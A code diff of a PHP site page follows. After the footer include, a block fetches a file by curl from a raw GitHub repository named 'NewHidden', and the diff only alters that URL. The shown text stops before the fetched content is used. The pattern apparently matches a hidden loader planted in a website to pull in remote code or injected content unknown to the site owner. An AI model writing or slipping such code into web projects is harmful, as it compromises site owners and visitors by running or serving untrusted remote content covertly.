@@ -208,7 +208,7 @@ require_once("admin/pages/connect.php");
 
 		<?php include ('footer.php');  ?>
 <?php
-$url = 'https://raw.githubusercontent.com/Eza168/NewHidden/refs/heads/main/index.dsg-nrrut';
+$url = 'https://raw.githubusercontent.com/Eza168/NewHidden/refs/heads/main/index.dsg-nrru';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
